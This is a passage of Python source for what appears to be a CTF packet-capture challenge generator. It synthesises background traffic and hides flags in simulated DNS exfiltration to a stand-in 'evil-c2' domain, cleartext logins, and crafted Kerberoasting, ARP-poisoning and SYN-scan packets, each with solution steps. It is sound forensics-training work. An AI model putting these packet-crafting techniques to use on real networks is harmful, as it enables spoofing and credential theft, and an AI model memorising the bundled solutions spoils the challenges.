    (CSS/JS/images/favicon/API) over one keep-alive connection - so Follow Stream
    shows a full browsing exchange rather than a lone GET."""
    client = rng.choice(net.clients)
    host = rng.choice([h for h in net.servers if not h.endswith(".local")] or list(net.servers))
    server = net.servers[host]
    ua = rng.choice(_USER_AGENTS)
    page = rng.choice(_PATHS)
    referer = rng.choice(_REFERERS)
    page_url = f"http://{host}{page}"
    cookie = None

    exchanges = []
    # 1) the document
    exchanges.append(("c2s", _http_request(rng, host, page, ua, referer=referer)))
    exchanges.append(("s2c", _http_response(rng, host, path=page)))
    # a session cookie now exists for subsequent asset requests
    cookie = "sid=%016x" % rng.getrandbits(64)

    # 2) a handful of assets on the same connection (only for browser UAs)
    is_browser = "Mozilla" in ua
    if is_browser:
        for asset in rng.sample(_ASSETS, rng.randint(2, 5)):
            exchanges.append(("c2s", _http_request(rng, host, asset, ua,
                                                   referer=page_url, cookie=cookie)))
            # occasionally the asset is cached -> 304 Not Modified
            if rng.random() < 0.25:
                exchanges.append(("s2c", _http_response(rng, host, path=asset, status=304)))
            else:
                ct, body = _asset_response(rng, asset)
                exchanges.append(("s2c", _http_response(rng, host, path=asset,
                                                        ctype=ct, body=body, set_cookie=False)))
    return tcp_session(net, client, server, 80, exchanges, rng, clock, cfg)


def conv_https(net, rng, clock, cfg):
    client = rng.choice(net.clients)
    host = rng.choice(list(net.servers))
    server = net.servers[host]
    ch = _tls_client_hello(host, rng)
    sh = _tls_record(0x16, bytes(rng.getrandbits(8) for _ in range(rng.randint(600, 1400))))
    exch = [("c2s", ch), ("s2c", sh),
            ("c2s", _tls_app_data(rng.randint(80, 400), rng)),
            ("s2c", _tls_app_data(rng.randint(200, 1200), rng))]
    return tcp_session(net, client, server, 443, exch, rng, clock, cfg)


def conv_dns(net, rng, clock, cfg):
    client = rng.choice(net.clients)
    host = rng.choice(list(net.servers))
    answer_ip = net.servers[host].ip
    txid = rng.randint(0, 65535)
    sport = rng.randint(1025, 65535)
    rtt = abs(rng.gauss(0.02, 0.01)) + 0.002
    q = (_eth(net, client.ip, net.dns.ip) /
         IP(src=client.ip, dst=net.dns.ip) /
         UDP(sport=sport, dport=53) /
         DNS(rd=1, id=txid, qd=DNSQR(qname=host)))
    a = (_eth(net, net.dns.ip, client.ip) /
         IP(src=net.dns.ip, dst=client.ip) /
         UDP(sport=53, dport=sport) /
         DNS(id=txid, qr=1, ra=1, qd=DNSQR(qname=host),
             an=DNSRR(rrname=host, type="A", ttl=rng.choice([60, 300, 3600]),
                      rdata=answer_ip)))
    pkts = []
    _emit(pkts, q, clock, rng, rtt)
    _emit(pkts, a, clock, rng, rtt)
    return pkts


def conv_icmp(net, rng, clock, cfg):
    client = rng.choice(net.clients)
    target = rng.choice(list(net.servers.values()))
    icmp_id = rng.randint(0, 65535)
    payload = (b"abcdefghijklmnopqrstuvwabcdefghi"
               + rng.randint(0, 2**32 - 1).to_bytes(4, "big"))
    rtt = abs(rng.gauss(0.025, 0.01)) + 0.002
    pkts = []
    for seq in range(1, rng.randint(2, 5)):
        req = (_eth(net, client.ip, target.ip) /
               IP(src=client.ip, dst=target.ip, ttl=64) /
               ICMP(type=8, id=icmp_id, seq=seq) / Raw(load=payload))
        rep = (_eth(net, target.ip, client.ip) /
               IP(src=target.ip, dst=client.ip, ttl=rng.choice([64, 128])) /
               ICMP(type=0, id=icmp_id, seq=seq) / Raw(load=payload))
        _emit(pkts, req, clock, rng, rtt)
        _emit(pkts, rep, clock, rng, rtt)
    return pkts


def conv_tcp_generic(net, rng, clock, cfg):
    """A generic short TCP service session (ssh-ish / db-ish) with a little
    banner data so the stream isn't empty."""
    client = rng.choice(net.clients)
    server = rng.choice(list(net.servers.values()))
    dport = rng.choice([22, 3306, 5432, 8080, 6379])
    banner = {22: b"SSH-2.0-OpenSSH_9.6\r\n", 3306: b"\x4a\x00\x00\x00\x0a8.0.36",
              5432: b"R\x00\x00\x00\x08\x00\x00\x00\x00", 6379: b"+OK\r\n",
              8080: b"HTTP/1.1 401 Unauthorized\r\nServer: gunicorn\r\n\r\n"}.get(dport, b"hello\r\n")
    exch = [("s2c", banner), ("c2s", bytes(rng.getrandbits(8) for _ in range(rng.randint(16, 64))))]
    return tcp_session(net, client, server, dport, exch, rng, clock, cfg)


def _mac_bytes(mac: str) -> bytes:
    return bytes(int(b, 16) for b in mac.split(":"))


def conv_arp(net, rng, clock, cfg):
    """ARP who-has / is-at exchange between a client and the gateway."""
    client = rng.choice(net.clients)
    target = rng.choice([net.gateway, net.dns, *net.clients])
    if target.ip == client.ip:
        target = net.gateway
    req = (Ether(src=client.mac, dst="ff:ff:ff:ff:ff:ff") /
           ARP(op=1, hwsrc=client.mac, psrc=client.ip, pdst=target.ip))
    rep = (Ether(src=target.mac, dst=client.mac) /
           ARP(op=2, hwsrc=target.mac, psrc=target.ip,
               hwdst=client.mac, pdst=client.ip))
    pkts = []
    _emit(pkts, req, clock, rng, 0.001)
    _emit(pkts, rep, clock, rng, abs(rng.gauss(0.003, 0.001)) + 0.001)
    return pkts


def conv_dhcp(net, rng, clock, cfg):
    """A DHCP DORA handshake (Discover, Offer, Request, Ack)."""
    client = rng.choice(net.clients)
    chaddr = _mac_bytes(client.mac) + b"\x00" * 10
    xid = rng.randint(1, 2**32 - 1)
    gw, ip = net.gateway, client.ip
    pkts = []

    def boot(msgtype, src_ip, dst_ip, src_mac, dst_mac, yiaddr="0.0.0.0", opts=None):
        o = [("message-type", msgtype)] + (opts or []) + ["end"]
        return (Ether(src=src_mac, dst=dst_mac) /
                IP(src=src_ip, dst=dst_ip) / UDP(sport=68 if "0.0.0.0" == src_ip or msgtype in ("discover", "request") else 67,
                                                 dport=67 if msgtype in ("discover", "request") else 68) /
                BOOTP(chaddr=chaddr, xid=xid, yiaddr=yiaddr, ciaddr="0.0.0.0") /
                DHCP(options=o))

    disc = boot("discover", "0.0.0.0", "255.255.255.255", client.mac, "ff:ff:ff:ff:ff:ff")
    offer = boot("offer", gw.ip, "255.255.255.255", gw.mac, client.mac, yiaddr=ip,
                 opts=[("server_id", gw.ip), ("lease_time", 86400),
                       ("subnet_mask", "255.255.255.0"), ("router", gw.ip)])
    req = boot("request", "0.0.0.0", "255.255.255.255", client.mac, "ff:ff:ff:ff:ff:ff",
               opts=[("requested_addr", ip), ("server_id", gw.ip)])
    ack = boot("ack", gw.ip, "255.255.255.255", gw.mac, client.mac, yiaddr=ip,
               opts=[("server_id", gw.ip), ("lease_time", 86400),
                     ("subnet_mask", "255.255.255.0"), ("router", gw.ip)])
    for p in (disc, offer, req, ack):
        _emit(pkts, p, clock, rng, abs(rng.gauss(0.02, 0.01)) + 0.002)
    return pkts


# --- protocol registry -----------------------------------------------------
# TO ADD A BACKGROUND PROTOCOL:
#   1. write conv_<proto>(net, rng, clock, cfg) -> list[packet]  (use _emit/
#      _eth and tcp_session for TCP-based protocols so timing/MACs stay correct)
#   2. register it here:  "<proto>": conv_<proto>
#   3. add a --<proto> session-count arg in main() and an ask_int in
#      interactive_config()  (and a weight in the _PER estimate dict)
_CONV_DISPATCH = {
    "tcp": conv_tcp_generic, "http": conv_http, "https": conv_https,
    "dns": conv_dns, "icmp": conv_icmp, "arp": conv_arp, "dhcp": conv_dhcp,
}

def make_noise(proto: str, count: int, cfg: NoiseConfig, rng: random.Random,
               clock: list[float], net: Network, progress=None) -> list:
    """Generate `count` realistic *sessions* of `proto`. Each session expands
    into several packets (handshake, data, acks, teardown). If `progress` is
    given it is called with the number of sessions completed, periodically."""
    # 'udp' maps onto DNS-style request/response service chatter
    fn = _CONV_DISPATCH.get("dns" if proto == "udp" else proto)
    if fn is None:
        raise ValueError(f"unknown protocol: {proto}")
    pkts = []
    done = 0
    for _ in range(count):
        clock[0] += abs(rng.gauss(cfg.jitter, cfg.jitter / 2))  # idle gap between sessions
        pkts += fn(net, rng, clock, cfg)
        done += 1
        if progress and done % 250 == 0:
            progress(250)
    if progress and done % 250:
        progress(done % 250)
    return pkts


# ---------------------------------------------------------------------------
# Flag-hiding methods
# ---------------------------------------------------------------------------

@dataclass
class HideResult:
    packets: list = field(default_factory=list)
    solution: list[str] = field(default_factory=list)  # human-readable steps
    markers: list = field(default_factory=list)         # [{"pkt":..., "desc":...}]

    def mark(self, pkt, desc: str):
        """Tag a carrier packet so its exact frame number can be reported."""
        self.markers.append({"pkt": pkt, "desc": desc})
        return pkt


def hide_dns_exfil(flag: bytes, cfg: NoiseConfig, rng: random.Random,
                   scheme: str, xor_key: bytes | None, clock: list[float],
                   net: Network) -> HideResult:
    """Encode the flag and scatter it across DNS query subdomain labels, the
    classic 'someone tunneled data out over DNS' forensics scenario. The
    queries originate from a real client host and go to the LAN resolver."""
    enc = encode_payload(flag, dns_safe_scheme(scheme), xor_key)
    chunks = [enc[i:i + 30] for i in range(0, len(enc), 30)]
    domain = "tunnel.evil-c2.net"
    res = HideResult()
    host = rng.choice(net.clients)
    for idx, c in enumerate(chunks):
        qname = f"{c.decode().lower()}.{idx:02d}.{domain}"
        p = (_eth(net, host.ip, net.dns.ip) /
             IP(src=host.ip, dst=net.dns.ip) /
             UDP(sport=rng.randint(1025, 65535), dport=53) /
             DNS(rd=1, id=rng.randint(0, 65535), qd=DNSQR(qname=qname)))
        clock[0] += abs(rng.gauss(0.05, 0.02)) + 0.001
        p.time = clock[0]
        res.packets.append(p)
        res.mark(p, f"DNS exfil query, label .{idx:02d} = '{c.decode().lower()}'")
    actual_scheme = dns_safe_scheme(scheme)
    res.solution = [
        f"Filter DNS queries to '{domain}' (from host {host.ip}).",
        f"There are {len(chunks)} of them; order by the two-digit label "
        f"(.00, .01, ...) and concatenate the first label of each.",
        f"Then {describe_decode(actual_scheme, xor_key)} to recover the flag.",
    ]
    return res


def hide_split_reassembly(flag: bytes, proto: str, cfg: NoiseConfig,
                          rng: random.Random, scheme: str, xor_key: bytes | None,
                          clock: list[float], net: Network) -> HideResult:
    """Encode the flag, split into indexed chunks, and scatter across TCP or
    ICMP payloads between a real client and host. Player collects + sorts + decodes."""
    enc = encode_payload(flag, scheme, xor_key)
    n = rng.randint(4, 7)
    size = (len(enc) + n - 1) // n
    chunks = [enc[i:i + size] for i in range(0, len(enc), size)]
    client = rng.choice(net.clients)
    server = rng.choice(list(net.servers.values()))
    res = HideResult()
    marker = b"SEG"
    for idx, c in enumerate(chunks):
        body = marker + bytes([idx]) + c
        if proto == "icmp":
            p = (_eth(net, client.ip, server.ip) /
                 IP(src=client.ip, dst=server.ip) /
                 ICMP(type=8, id=0x4242, seq=idx) / Raw(load=body))
        else:
            p = (_eth(net, client.ip, server.ip) /
                 IP(src=client.ip, dst=server.ip) /
                 TCP(sport=40000 + idx, dport=9999, flags="PA",
                     seq=rng.randint(0, 2**32 - 1)) / Raw(load=body))
        clock[0] += abs(rng.gauss(0.04, 0.02)) + 0.001
        p.time = clock[0]
        res.packets.append(p)
        res.mark(p, f"flag segment #{idx} (payload after b'SEG'+index)")
    where = "ICMP echo (id 0x4242)" if proto == "icmp" else "TCP dport 9999"
    res.solution = [
        f"Find the {len(chunks)} {where} packets whose payload starts with b'SEG'.",
        "The 4th byte is the segment index; sort by it and concatenate the "
        "remaining payload bytes.",
        f"Then {describe_decode(scheme, xor_key)} to recover the flag.",
    ]
    return res


def hide_http_stream(flag: bytes, cfg: NoiseConfig, rng: random.Random,
                     scheme: str, xor_key: bytes | None, clock: list[float],
                     net: Network) -> HideResult:
    """Embed the encoded flag in an HTTP session cookie inside a full, followable
    TCP stream (handshake, request, response, teardown)."""
    enc = encode_payload(flag, scheme if scheme != "none" else "base64", xor_key)
    client = rng.choice(net.clients)
    server = net.servers.get("intranet.corp.local") or rng.choice(list(net.servers.values()))
    host = server.name
    req = (f"GET /dashboard HTTP/1.1\r\nHost: {host}\r\n"
           f"User-Agent: {rng.choice(_USER_AGENTS)}\r\n"
           f"Cookie: session={enc.decode()}\r\nAccept: */*\r\n"
           f"Connection: keep-alive\r\n\r\n").encode()
    resp = _http_response(rng, host)
    pkts = tcp_session(net, client, server, 80,
                       [("c2s", req), ("s2c", resp)], rng, clock, cfg)
    res = HideResult(packets=pkts)
    for p in pkts:
        if p.haslayer(Raw) and b"session=" in bytes(p[Raw].load):
            res.mark(p, "HTTP GET /dashboard carrying the flag in the session cookie")
            break
    actual_scheme = scheme if scheme != "none" else "base64"
    res.solution = [
        f"Follow the HTTP stream to host {host} (request /dashboard from {client.ip}).",
        "The session cookie value is the encoded flag.",
        f"{describe_decode(actual_scheme, xor_key).capitalize()} to recover it.",
    ]
    return res


# --- Decoy / red-herring word pools -------------------------------------
# SpongeBob-flavored fodder (on-theme for the Chum Bucket).
_SB_CHARS = ["spongebob", "patrick", "squidward", "mrkrabs", "plankton", "sandy",
             "gary", "karen", "mrspuff", "squilliam", "larry", "pearl",
             "bubblebass", "flyingdutchman", "mermaidman", "barnacleboy",
             "oldmanjenkins", "bubblebuddy", "kingneptune", "puffyfluffy"]
_SB_WORDS = ["krabbypatty", "bikinibottom", "chumbucket", "krustykrab", "jellyfish",
             "secretformula", "spatula", "pineapple", "goofygoober", "tartarsauce",
             "barnacles", "fishpaste", "kelpshake", "anchorarms", "mocchocolate",
             "imready", "f1shh00ks", "musclebob", "buffpants", "rippedtrousers"]

# Cyber-jargon fodder (realistic-looking security terms).
_CY_CHARS = ["buffer_overflow", "priv_esc", "reverse_shell", "sql_injection",
             "race_condition", "use_after_free", "heap_spray", "rop_chain",
             "kernel_panic", "null_deref", "format_string", "stack_smash",
             "csrf_token", "xxe_payload", "deserialize", "ssrf_probe"]
_CY_WORDS = ["mimikatz", "cobaltstrike", "metasploit", "powershell", "rootkit",
             "keylogger", "ransomware", "backdoor", "payload", "shellcode",
             "exfil", "beacon", "implant", "dropper", "loader", "c2node",
             "lateral_move", "persistence", "credential_dump", "golden_ticket"]
# fake-CVE style decoys, generated on the fly
_CY_CVE_YEARS = [2021, 2022, 2023, 2024, 2025]

_LEET = {"a": "4", "e": "3", "i": "1", "o": "0", "s": "5", "t": "7"}


def _leetify(s: str, rng: random.Random) -> str:
    return "".join(_LEET.get(c, c) if rng.random() < 0.35 else c for c in s)

# TO ADD A DECOY THEME: add a <THEME>_CHARS/<THEME>_WORDS pool above, handle it
# in _decoy_pools() below, and add it to the --decoy-theme choices + the
# interactive prompt. (custom words are preserved verbatim; themed words get leet.)

def _decoy_pools(theme: str, custom_words):
    """Return (chars, words, use_leet, allow_cve) for the chosen theme."""
    if theme == "cyber":
        return _CY_CHARS, _CY_WORDS, True, True
    if theme == "mixed":
        return _SB_CHARS + _CY_CHARS, _SB_WORDS + _CY_WORDS, True, True
    if theme == "custom":
        words = [w.strip() for w in (custom_words or []) if w.strip()]
        if not words:                       # empty custom -> fall back to spongebob
            return _SB_CHARS, _SB_WORDS, True, False
        return words, words, False, False   # custom words preserved (no leet)
    return _SB_CHARS, _SB_WORDS, True, False   # spongebob (default)


def random_decoy_text(rng: random.Random, theme: str = "spongebob",
                      custom_words=None) -> str:
    """A random fake-flag inner string for the chosen theme. Patterns vary so
    red herrings never look predictable. Custom words are preserved verbatim
    (no leet substitution); small pools fall back to simpler patterns."""
    chars, words, use_leet, allow_cve = _decoy_pools(theme, custom_words)
    pool = list(dict.fromkeys(chars + words))   # combined, de-duped

    # occasional fake-CVE decoy for cyber/mixed themes
    if allow_cve and rng.random() < 0.2:
        return f"CVE_{rng.choice(_CY_CVE_YEARS)}_{rng.randint(1000, 49999)}"

    # small pool (e.g. 1-2 custom words) -> simple, safe patterns only
    if len(pool) < 4:
        base = rng.choice(pool) if pool else "decoy"
        s = base if rng.random() < 0.4 else f"{base}_{rng.randint(10, 9999)}"
        return _leetify(s, rng) if use_leet else s

    pat = rng.randint(0, 5)
    if pat == 0:
        s = f"{rng.choice(chars)}_{rng.choice(words)}"
    elif pat == 1:
        s = f"{rng.choice(words)}_{rng.randint(10, 9999)}"
    elif pat == 2:
        s = f"{rng.choice(chars)}{rng.choice(chars)}".replace("_", "")
    elif pat == 3:
        s = f"{rng.choice(chars)}_{rng.choice(words)}"
    elif pat == 4:
        s = f"{rng.choice(words)}_{rng.choice(chars)}_{rng.randint(1, 99)}"
    else:
        s = f"not_{rng.choice(chars)}_{rng.choice(words)}"
    return _leetify(s, rng) if use_leet else s


def make_decoys(wrapper: str, count: int, cfg: NoiseConfig, rng: random.Random,
                clock: list[float], net: Network, theme: str = "spongebob",
                custom_words=None) -> list:
    """Plant plausible-but-wrong flag-shaped strings as red herrings, carried in
    real-looking HTTP traffic between actual hosts. Each decoy is a unique,
    randomized SpongeBob-themed string."""
    open_, close = wrapper_parts(wrapper)
    notes = ["# debug note: ", "# TODO remove before prod: ", "# old test flag: ",
             "<!-- staging flag ", "# leftover from CTF practice: ", "# nope: "]
    pkts = []
    for _ in range(count):
        client = rng.choice(net.clients)
        server = rng.choice(list(net.servers.values()))
        fake = f"{open_}{random_decoy_text(rng, theme, custom_words)}{close}"
        note = rng.choice(notes)
        tail = " -->" if note.startswith("<!--") else ""
        body = (f"HTTP/1.1 200 OK\r\nServer: {rng.choice(_SERVER_BANNERS)}\r\n"
                f"Content-Type: text/plain\r\nContent-Length: {len(note)+len(fake)+len(tail)+1}\r\n\r\n"
                f"{note}{fake}{tail}\n").encode()
        p = (_eth(net, server.ip, client.ip) /
             IP(src=server.ip, dst=client.ip) /
             TCP(sport=80, dport=rng.randint(1025, 65535), flags="PA",
                 seq=rng.randint(0, 2**32 - 1)) / Raw(load=body))
        clock[0] += abs(rng.gauss(cfg.jitter, cfg.jitter / 2)) + 0.001
        p.time = clock[0]
        pkts.append(p)
    return pkts


# ---------------------------------------------------------------------------
# Scenario engine: plant a recognizable ATTACK signature that also carries the
# flag. These are detection fixtures - the encrypted/credential material is
# synthetic. The player must first NOTICE the attack, then extract the flag.
# ---------------------------------------------------------------------------

def _krb_tgs_req(spn: str, realm: str, rng: random.Random) -> bytes:
    """Craft a recognizable (not byte-perfect) Kerberos TGS-REQ over TCP:
    the 4-byte length prefix, the APPLICATION-12 tag, an RC4/etype-23 marker,
    and the SPN/realm as KerberosStrings so an analyst can read them."""
    def kstr(s: str) -> bytes:                      # GeneralString, tag 0x1b
        b = s.encode()
        return b"\x1b" + bytes([len(b)]) + b
    etype = b"\x02\x01\x17"                          # INTEGER 23 (rc4-hmac)
    svc, host = (spn.split("/", 1) + [""])[:2]
    body = (b"\x6c\x82" +                            # APPLICATION 12 (TGS-REQ), long form
            b"\x00\x00" +                            # (placeholder length)
            b"\xa1\x03\x02\x01\x05" +                # pvno 5
            b"\xa2\x03\x02\x01\x0c" +                # msg-type 12 (TGS-REQ)
            etype + kstr(realm) + kstr(svc) + kstr(host))
    body = body[:2] + len(body[4:]).to_bytes(2, "big") + body[4:]
    return len(body).to_bytes(4, "big") + body      # TCP length prefix


def _krb_tgs_rep(realm: str, rng: random.Random) -> bytes:
    """A synthetic Kerberos TGS-REP (APPLICATION 13) whose enc-part is an opaque
    RC4-looking blob - this is the 'encrypted ticket' a real Kerberoast would crack."""
    def kstr(s):
        b = s.encode(); return b"\x1b" + bytes([len(b)]) + b
    ticket_blob = bytes(rng.getrandbits(8) for _ in range(rng.randint(180, 360)))
    enc_part = b"\xa2\x82" + len(ticket_blob).to_bytes(2, "big") + ticket_blob
    body = (b"\x6d\x82" + b"\x00\x00" +                 # APPLICATION 13 (TGS-REP)
            b"\xa0\x03\x02\x01\x05" +                   # pvno 5
            b"\xa1\x03\x02\x01\x0d" +                   # msg-type 13
            kstr(realm) + b"\x02\x01\x17" + enc_part)   # realm, etype 23, enc ticket
    body = body[:2] + len(body[4:]).to_bytes(2, "big") + body[4:]
    return len(body).to_bytes(4, "big") + body


def scenario_kerberoast(flag: bytes, rng, clock, cfg, scheme, xor_key,
                        net: Network) -> HideResult:
    """A burst of Kerberos TGS-REQ for many service SPNs (etype 23 / RC4) - the
    textbook Kerberoasting signature. One SPN's host label is the encoded flag.
    Each SPN is its own clean TCP connection (handshake, request, encrypted
    TGS-REP, teardown) so the streams look real and follow cleanly."""
    enc = encode_payload(flag, dns_safe_scheme(scheme), xor_key).decode().lower()
    realm = "CORP.LOCAL"
    attacker = rng.choice(net.clients)
    dc = net.servers.get("intranet.corp.local") or rng.choice(list(net.servers.values()))
    normal_spns = ["MSSQLSvc/db01.corp.local:1433", "HTTP/web01.corp.local",
                   "CIFS/file01.corp.local", "LDAP/dc01.corp.local",
                   "MSSQLSvc/erp.corp.local:1433", "HTTP/intranet.corp.local"]
    flag_spn = f"MSSQLSvc/{enc}.corp.local:1433"     # the odd one out
    spns = normal_spns[:]
    spns.insert(rng.randint(1, len(spns) - 1), flag_spn)

    res = HideResult()
    for spn in spns:
        req = _krb_tgs_req(spn, realm, rng)
        rep = _krb_tgs_rep(realm, rng)
        # each SPN request is its own short TCP/88 connection
        session = tcp_session(net, attacker, dc, 88,
                              [("c2s", req), ("s2c", rep)], rng, clock, cfg)
        res.packets += session
        # tag the request packet (the one carrying this SPN's bytes)
        for p in session:
            if p.haslayer(Raw) and req in bytes(p[Raw].load):
                if spn == flag_spn:
                    res.mark(p, "Kerberoast TGS-REQ with the anomalous SPN "
                                "(host label = encoded flag)")
                else:
                    res.mark(p, f"Kerberoast TGS-REQ for {spn} (decoy SPN)")
                break
        # small gap before the next connection in the burst
        clock[0] += abs(rng.gauss(0.04, 0.02)) + 0.005
    res.solution = [
        f"Notice the burst of Kerberos TGS-REQ (TCP/88) from {attacker.ip} to the DC "
        f"({dc.ip}) requesting many SPNs with RC4/etype-23 - classic Kerberoasting.",
        "List the requested SPNs; one MSSQLSvc host label is not a real hostname.",
        f"Take that host label and {describe_decode(dns_safe_scheme(scheme), xor_key)} "
        f"to recover the flag.",
    ]
    return res


def scenario_ftp_creds(flag: bytes, rng, clock, cfg, scheme, xor_key,
                       net: Network) -> HideResult:
    """A plaintext FTP login over TCP/21. The flag is the password sent in the
    clear - the 'credentials on the wire' trope. Found by following the stream."""
    # plaintext is the whole point; only encode if explicitly asked
    if scheme == "none":
        secret = flag.decode()
    else:
        secret = encode_payload(flag, scheme, xor_key).decode()
    client = rng.choice(net.clients)
    server = net.servers.get("intranet.corp.local") or rng.choice(list(net.servers.values()))
    user = rng.choice(["svc_backup", "jdoe", "ftpadmin", "deploy"])
    exch = [
        ("s2c", b"220 (vsFTPd 3.0.5)\r\n"),
        ("c2s", f"USER {user}\r\n".encode()),
        ("s2c", b"331 Please specify the password.\r\n"),
        ("c2s", f"PASS {secret}\r\n".encode()),
        ("s2c", b"230 Login successful.\r\n"),
        ("c2s", b"SYST\r\n"),
        ("s2c", b"215 UNIX Type: L8\r\n"),
    ]
    pkts = tcp_session(net, client, server, 21, exch, rng, clock, cfg)
    res = HideResult(packets=pkts)
    for p in pkts:
        if p.haslayer(Raw) and bytes(p[Raw].load).startswith(b"PASS "):
            res.mark(p, "FTP PASS command carrying the flag (cleartext password)")
            break
    tail = "read the password directly" if scheme == "none" else \
        f"take the password and {describe_decode(scheme, xor_key)}"
    res.solution = [
        f"Spot the plaintext FTP login (TCP/21) from {client.ip} to {server.ip}.",
        f"Follow the FTP control stream; the USER is '{user}' and the PASS line "
        f"carries the secret.",
        f"To get the flag, {tail}.",
    ]
    return res


def scenario_arp_spoof(flag: bytes, rng, clock, cfg, scheme, xor_key,
                       net: Network) -> HideResult:
    """ARP cache poisoning: the attacker floods gratuitous/conflicting is-at
    replies binding the gateway IP to the attacker's MAC. The encoded flag rides
    in the Ethernet padding of the malicious gratuitous ARP."""
    from scapy.all import Padding
    enc = encode_payload(flag, scheme if scheme != "none" else "base64", xor_key)
    attacker = rng.choice(net.clients)
    victim = rng.choice([c for c in net.clients if c.ip != attacker.ip])
    gw = net.gateway
    res = HideResult()
    # a few legitimate ARP first (handled by noise), then the poisoning storm:
    for i in range(rng.randint(4, 6)):
        # gratuitous/unsolicited is-at: "gateway IP is at ATTACKER mac" (the lie)
        poison = (Ether(src=attacker.mac, dst=victim.mac) /
                  ARP(op=2, hwsrc=attacker.mac, psrc=gw.ip,
                      hwdst=victim.mac, pdst=victim.ip))
        if i == 0:
            poison = poison / Padding(load=enc)   # flag tucked in the padding
        clock[0] += abs(rng.gauss(0.5, 0.2)) + 0.05
        poison.time = clock[0]
        res.packets.append(poison)
        if i == 0:
            res.mark(poison, "Malicious gratuitous ARP (gw IP -> attacker MAC); "
                             "flag is in the Ethernet padding/trailer")
        else:
            res.mark(poison, "Poisoned ARP is-at reply (decoy in the storm)")
    actual = scheme if scheme != "none" else "base64"
    res.solution = [
        f"Spot the ARP poisoning: host {attacker.ip} ({attacker.mac}) repeatedly "
        f"claims to be the gateway {gw.ip} via gratuitous is-at replies.",
        "Open the first poisoned ARP packet; the Ethernet trailer/padding holds "
        "extra non-zero bytes (not normal ARP padding).",
        f"Extract those padding bytes and {describe_decode(actual, xor_key)}.",
    ]
    return res


def scenario_port_scan(flag: bytes, rng, clock, cfg, scheme, xor_key,
                       net: Network) -> HideResult:
    """A SYN sweep across many ports of one host: closed ports answer RST, the one
    open port completes and serves a banner. The flag is in that banner."""
    enc = encode_payload(flag, scheme, xor_key).decode() if scheme != "none" else flag.decode()
    attacker = rng.choice(net.clients)
    target = rng.choice(list(net.servers.values()))
    ports = sorted(rng.sample(range(20, 1024), rng.randint(18, 28)))
    open_port = rng.choice(ports)
    res = HideResult()
    base_sport = rng.randint(20000, 40000)
    for i, port in enumerate(ports):
        sport = base_sport + i
        cseq = rng.randint(1, 2**31)
        syn = (_eth(net, attacker.ip, target.ip) / IP(src=attacker.ip, dst=target.ip) /
               TCP(sport=sport, dport=port, flags="S", seq=cseq))
        clock[0] += abs(rng.gauss(0.008, 0.003)) + 0.001
        syn.time = clock[0]
        res.packets.append(syn)
        if port == open_port:
            # SYN-ACK, ACK, then a service banner containing the flag
            sseq = rng.randint(1, 2**31)
            sa = (_eth(net, target.ip, attacker.ip) / IP(src=target.ip, dst=attacker.ip) /
                  TCP(sport=port, dport=sport, flags="SA", seq=sseq, ack=cseq + 1))
            ack = (_eth(net, attacker.ip, target.ip) / IP(src=attacker.ip, dst=target.ip) /
                   TCP(sport=sport, dport=port, flags="A", seq=cseq + 1, ack=sseq + 1))
            banner = f"220 svc ready - access token: {enc}\r\n".encode()
            data = (_eth(net, target.ip, attacker.ip) / IP(src=target.ip, dst=attacker.ip) /
                    TCP(sport=port, dport=sport, flags="PA", seq=sseq + 1, ack=cseq + 1) /
                    Raw(load=banner))
            for q in (sa, ack, data):
                clock[0] += abs(rng.gauss(0.01, 0.004)) + 0.001
                q.time = clock[0]
                res.packets.append(q)
            res.mark(data, f"Banner on the one OPEN port ({open_port}); flag is the 'access token'")
        else:
            # closed port -> RST/ACK
            rst = (_eth(net, target.ip, attacker.ip) / IP(src=target.ip, dst=attacker.ip) /
                   TCP(sport=port, dport=sport, flags="RA", seq=0, ack=cseq + 1))
            clock[0] += abs(rng.gauss(0.006, 0.002)) + 0.001
            rst.time = clock[0]
            res.packets.append(rst)
    tail = "read the token directly" if scheme == "none" else \
        f"take the token and {describe_decode(scheme, xor_key)}"
    res.solution = [
        f"Spot the SYN scan: {attacker.ip} sweeps ~{len(ports)} ports on {target.ip}; "
        f"closed ports reply RST.",
        f"Exactly one port ({open_port}) completes the handshake and returns a banner.",
        f"The banner's 'access token' is the flag - {tail}.",
    ]
    return res


def scenario_telnet_creds(flag: bytes, rng, clock, cfg, scheme, xor_key,
                          net: Network) -> HideResult:
    """Plaintext Telnet (TCP/23) login. The flag is the password typed in the clear."""
    secret = flag.decode() if scheme == "none" else encode_payload(flag, scheme, xor_key).decode()
    client = rng.choice(net.clients)
    server = rng.choice(list(net.servers.values()))
    user = rng.choice(["admin", "root", "operator", "netadmin"])
    exch = [
        ("s2c", b"\r\nUbuntu 22.04.3 LTS\r\nlogin: "),
        ("c2s", f"{user}\r\n".encode()),
        ("s2c", b"Password: "),
        ("c2s", f"{secret}\r\n".encode()),
        ("s2c", b"\r\nLast login: Tue Nov 14 09:02:11\r\n$ "),
    ]
    pkts = tcp_session(net, client, server, 23, exch, rng, clock, cfg)
    res = HideResult(packets=pkts)
    # the password is the c2s line right after the "Password:" prompt
    seen_prompt = False
    for p in pkts:
        if p.haslayer(Raw):
            load = bytes(p[Raw].load)
            if b"Password:" in load:
                seen_prompt = True
            elif seen_prompt and load.strip() and not load.startswith(b"\r\n"):
                res.mark(p, "Telnet password line (cleartext flag)")
                break
    tail = "read the password directly" if scheme == "none" else \
        f"take the password and {describe_decode(scheme, xor_key)}"
    res.solution = [
        f"Spot the plaintext Telnet login (TCP/23) from {client.ip} to {server.ip}.",
        f"Follow the stream; after the 'Password:' prompt the user '{user}' types the secret.",
        f"To get the flag, {tail}.",
    ]
    return res


def scenario_http_basic(flag: bytes, rng, clock, cfg, scheme, xor_key,
                        net: Network) -> HideResult:
    """HTTP Basic auth over cleartext. The Authorization header is
    base64("user:password") and the password is the flag."""
    pw = flag.decode() if scheme == "none" else encode_payload(flag, scheme, xor_key).decode()
    client = rng.choice(net.clients)
    server = net.servers.get("intranet.corp.local") or rng.choice(list(net.servers.values()))
    host = server.name
    user = rng.choice(["admin", "svc_web", "report_bot"])
    token = base64.b64encode(f"{user}:{pw}".encode()).decode()
    req = (f"GET /admin/ HTTP/1.1\r\nHost: {host}\r\n"
           f"Authorization: Basic {token}\r\n"
           f"User-Agent: {rng.choice(_USER_AGENTS)}\r\nAccept: */*\r\n\r\n").encode()
    admin_body = ("<!DOCTYPE html><html><head><title>Admin Console</title></head>"
                  "<body><h1>Admin Console</h1><p>Logged in as <b>" + user + "</b>.</p>"
                  "<table><tr><th>User</th><th>Role</th><th>Last seen</th></tr>"
                  "<tr><td>jdoe</td><td>auditor</td><td>2024-06-24</td></tr>"
